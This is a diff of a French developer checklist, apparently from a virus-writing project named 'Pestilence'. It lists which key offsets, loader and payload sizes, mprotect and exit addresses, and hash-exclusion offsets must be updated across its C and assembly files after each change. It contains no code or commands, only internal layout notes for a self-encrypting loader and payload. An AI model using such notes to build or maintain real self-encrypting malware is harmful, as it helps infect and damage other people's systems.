@@ -15,20 +15,32 @@ a chaque changements il faut verifier :
     S   offset hooks
     S   offset_calls
 
+    crypto.c
+    S   l'adresse de la cle dans Bis pour le hash ( patch key, C)
+    S   Adresse du depart de bis pour le jump ( start dans encrypt : addr du jmpr15 + 3, B)
+    M   Taille du loader (hash loader, F)
+    M   Taille du PAYLOAD + BIS ( hash loader, )
+    S   offset des cle a eviter dans loader (hash loader, 1ere loop, G)
+    S   offset de la cle a eviter dans bis (hash loader, 2eme loop patch_key a +4, H)
+
     pestilence.c
-    S   l'adresse des portes de sorties
-    M   l'adresse du mprotect dans loader ( patch loader)
-    S   l'adresse de la cle dans Bis pour le hash ( patch key)
-    S   Adresse du depart de bis pour le jump ( start dans encrypt : addr du jmpr15 + 3)
-    S   Adresse de sortie de main sur milieu de bis ( patch payload)
-    M   offset de la cle a eviter dans bis (hash loader, 2eme loop patch_key a +4)
-    M   offset des cle a eviter dans loader (hash loader, 1ere loop)
+
+    patch.c
+    S   l'adresse du mprotect dans loader ( patch loader, E)
+    S   Adresse de sortie de main sur milieu de bis ( patch payload, A)
+    S   l'adresse des portes de sorties (patch_bis, REPLACE)
+
+    check_ownfile.c
+    S   offset de l'index dans le loader (update own_index, I)
+    S   position du -1 dans le loader (update own_index, J)
 
     loader.s
-    S   Taille du Payload
-    M   Bis_size ( add rbx)
-    M   offset des cles a eviter (hash_loop1)
+    M   Taille du loader ( pour le hash)
+    S   Taille du Payload REPLACE1
+    S   Bis_size ( add rbx, REPLACE2)
+    S   offset des cles a eviter (hash_loop1)
 
     bis.s
+    M   Taille du Payload + Bis ( pour le hash)
     S   Taille du Payload
-    M   offset de la cle a eviter( hash_loop1)
+    S   offset de la cle a eviter( hash_loop1)
